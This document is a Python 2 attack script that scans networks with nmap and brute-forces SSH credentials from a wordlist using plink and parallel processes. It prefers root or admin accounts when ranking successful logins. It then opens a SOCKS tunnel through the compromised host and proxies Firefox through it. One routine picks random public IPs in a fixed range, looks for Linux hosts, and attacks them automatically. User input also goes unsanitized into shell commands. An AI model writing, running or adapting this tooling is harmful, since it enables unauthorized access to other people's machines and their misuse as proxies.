# -*- coding: utf-8 -*-
import socket
import nmap
import random
import os
import re
import subprocess
import time
from selenium import webdriver
import sys
import io
from multiprocessing import Pool

NAMES_PASSWORDS_FILE = "login.txt"
PROXY_PORT_NUMBER = 3200
LOCALHOST = "127.0.0.1"
STARTING_WEBSITE = "about:config"
DEFAULT_IP = "192.168.1.42"


def menu():
    return """1. Get IPs list.
2. Get information about a device.
3. Tunnel through device.
4. Exit.
(1/2/3/4)
"""


def get_list():
    nm = nmap.PortScanner()
    nm.scan()
    return nm.all_hosts()


def get_info():
    ip = raw_input("Insert ip: ")
    return os.system('nmap -O -Pn ' + ip)


def generate_ip():
    str_ip = "77."
    int_ip = random.randint(124, 127)
    str_ip += str(int_ip) + '.'
    int_ip = random.randint(0, 255)
    str_ip += str(int_ip) + '.'
    int_ip = random.randint(0, 255)
    str_ip += str(int_ip)
    print str_ip
    return str_ip


def check_if_up(ip):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.connect_ex((ip, 22))
        sock.shutdown(2)
        result = True
    except Exception as error:
        print "an error occured: " + str(error)
        result = False
    print result
    return result


def ran_ip():
    ip = generate_ip()
    pat = re.compile("Linux")
    ops = ""
    if check_if_up(ip):
        ops = os.system('nmap -O --osscan-guess ' + ip)
    while re.search(pat, str(ops)) is None:
        ip = generate_ip()
        if check_if_up(ip):
            ops = os.system('nmap -O --osscan-guess ' + ip)
    tunnel(ip)


def known_ip(ip=DEFAULT_IP):
    """pat = re.compile("Linux")
    ops = ""
    if check_if_up(ip):
        ops = os.system('nmap -O --osscan-guess ' + ip)
    while re.search(pat, str(ops)) is None:
        ip = raw_input("Insert another ip: ")
        if check_if_up(ip):
            ops = os.system('nmap -O --osscan-guess ' + ip)"""
    tunnel(ip)


# def init_tunnel():
#     ans = raw_input("Generate ip [Y/N]? ")
#     pat = re.compile("Linux")
#     if ans.upper() == 'Y':
#         ran_ip(pat)
#     else:
#         known_ip()
#     return ip


def handle(ans):
    if ans == 1:
        print get_list()
    if ans == 2:
        print get_info()
    if ans == 3:
        known_ip(ip=raw_input("insert ip: "))


def check(ans):
    return ans in [1, 2, 3]


def install_firefox_proxy(proxy_host, proxy_port):
    """
    Change the Firefox proxy network settings to fit the ssh proxy tunnel
    returns a Firefox WebDriver instance
    """
    fp = webdriver.FirefoxProfile()
    fp.set_preference("network.proxy.type", 1)
    fp.set_preference("network.proxy.socks", proxy_host)
    fp.set_preference("network.proxy.socks_port", int(proxy_port))
    fp.set_preference("network.proxy.socks_remote_dns", True)
    fp.update_preferences()
    return webdriver.Firefox(firefox_profile=fp)


def get_name_pass(ip):
    """ Receives ip and makes all of the names and passwords
    in the login.txt file into a list of tuples
    each tuple consisting of (name, password, ip)
    """
    n_and_p = []

    with open(NAMES_PASSWORDS_FILE, 'r') as usr_pass_file:
        for line in usr_pass_file:
            usr_pass = line.split(',')
            name = usr_pass[0] # username part
            password = usr_pass[1].replace("\n", "") # password part
            params = (name, password, ip)
            n_and_p.append(params)

    return n_and_p


def check_name_and_password((name, password, ip)):
    """ Receives a tuple of (name, password, ip) and checks
    if the name and password are correct for the ip
    if so returns the them in a tuple (name, password)
    else returns an empty tuple
    """
    print "Process %d working on: %s %s %s" % (os.getpid(), name, password, ip)

    correct = ()

    command = "plink -D %s -pw %s %s@%s" % (str(PROXY_PORT_NUMBER), password, name, ip)  # the shell command

    filename = 'logs/output%d.log' % os.getpid()
    with io.open(filename, 'w') as writer, io.open(filename, 'rb', 1) as reader:
        process = subprocess.Popen(command, stdout=writer,
                                            shell=True)
        time.sleep(7)
        process.kill()

        while process.poll() is None:
            sys.stdout.write(reader.read())
            time.sleep(0.5)
            # Read the remaining
            sys.stdout.write(reader.read())
        with open(filename, 'rb') as my_file:
            if "password" not in my_file.read():
                correct = name, password

    print "Process %d finished working on: %s %s %s" % (os.getpid(), name, password, ip)

    return correct


def find_name_and_password(ip):
    """ Receives an ip and uses multiprocessing
    to check multiple username and password pairs for given ip
    returns a list of tuples
    """
    if not os.path.exists(r"logs"):
        os.mkdir(r'logs')

    names_pass = get_name_pass(ip)

    start = time.time()

    pool = Pool(4)  # 4 is number of processes to open at once
    results = pool.map(check_name_and_password, names_pass)
    pool.close()

    end = time.time()

    print "\nTime to complete: %d \n" % (end - start)
    results = [t for t in results if t] # filters out empty tuples
    return results


def open_firefox():
    """ Open up the firefox browser with the changed settings """
    driver = install_firefox_proxy(LOCALHOST, PROXY_PORT_NUMBER)
    driver.get(STARTING_WEBSITE)


def tunnel_putty_link(name, password, ip):
    """ Tunnels with ssh using putty link tool """
    try:
        subprocess.call("plink -D %s -pw %s %s@%s" % (str(PROXY_PORT_NUMBER), password, name, ip))
    except Exception as error:
        print "An error occured: " + str(error)


# def tunnel_putty_link(name, password, ip):
#     sshp = subprocess.Popen(['ssh'],
#                             ip,
#                             stdin=subprocess.PIPE,
#                             stdout=subprocess.PIPE,
#                             universal_newlines=True,
#                             bufsize=0)
#     sshp.stdin.write("ls .\n")
#     sshp.stdin.write("echo END\n")
#     sshp.stdin.write("uptime\n")
#     sshp.stdin.write("echo END\n")


def check_best_user(correct_user_pass):
    """
    Receives a list of tuples and checks whether
    a root or admin account is present and if so returns them
    if they are not present returns any correct username and password pair
    """
    best = ("notfound", "notfound")
    for user_pass in correct_user_pass:
        if user_pass[0] == "root":
            best = user_pass
        elif user_pass[0] == "admin" and best[0] != "root":
            best = user_pass
        elif best[0] != "root" and best[0] != "admin":
            best = user_pass
    return best


def tunnel(ip):
    """
    Finds a correct name and password pair and uses it to
    tunnel and serve as the proxy for firefox to go through
    """
    correct = find_name_and_password(ip)
    if not correct:
        return "list is empty EXITING, no matching username and password pairs were found"
    name, password = check_best_user(correct)
    open_firefox()
    tunnel_putty_link(name, password, ip)


def main():
    ans = input(menu())
    while ans != 4:
        if check(ans):
            handle(ans)
        else:
            print "Invalid request"
        ans = input(menu())


if __name__ == '__main__':
    main()
